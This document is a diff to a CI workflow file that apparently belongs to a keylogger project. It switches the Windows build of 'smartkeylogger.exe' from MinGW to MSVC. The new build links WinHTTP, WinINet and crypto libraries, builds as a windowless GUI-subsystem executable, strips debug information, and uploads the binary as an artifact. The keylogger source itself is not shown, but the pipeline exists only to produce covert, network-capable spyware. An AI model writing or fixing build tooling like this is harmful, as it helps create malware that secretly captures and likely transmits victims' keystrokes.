@@ -1,31 +1,42 @@
-name: Build Smart Keylogger
+name: Build with MSVC
 
 on: [push, workflow_dispatch]
 
 jobs:
-  build-windows:
+  build:
     runs-on: windows-latest
     
     steps:
     - uses: actions/checkout@v4
     
-    - name: Set up MinGW
-      uses: egor-tensin/setup-mingw@v2
-      with:
-        platform: x64
-        version: 13.2.0-rt_v11-rev0
-    
-    - name: Build with MinGW
+    - name: Setup MSVC
+      uses: microsoft/setup-msbuild@v1.3
+      
+    - name: Build
+      shell: cmd
       run: |
-        g++ -o smartkeylogger.exe main.cpp \
-          -static -mwindows \
-          -lwinhttp -luser32 -lshell32 -lole32 -lkernel32 \
-          -lgdi32 -lcrypt32 -liphlpapi -lws2_32 -ladvapi32 \
-          -lwininet -lcomdlg32 \
-          -O2 -s -fpermissive
+        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+        cl.exe main.cpp ^
+          /Fe:smartkeylogger.exe ^
+          /EHsc ^
+          /O2 ^
+          /MT ^
+          /link ^
+          /SUBSYSTEM:WINDOWS ^
+          winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
+          gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib wininet.lib ^
+          /DEBUG:NONE ^
+          /OPT:REF
         
-    - name: List files
-      run: dir
+    - name: Check if file exists
+      run: |
+        if exist smartkeylogger.exe (
+          echo File created successfully
+          dir smartkeylogger.exe
+        ) else (
+          echo File not found
+          exit 1
+        )
         
     - name: Upload artifact
       uses: actions/upload-artifact@v4
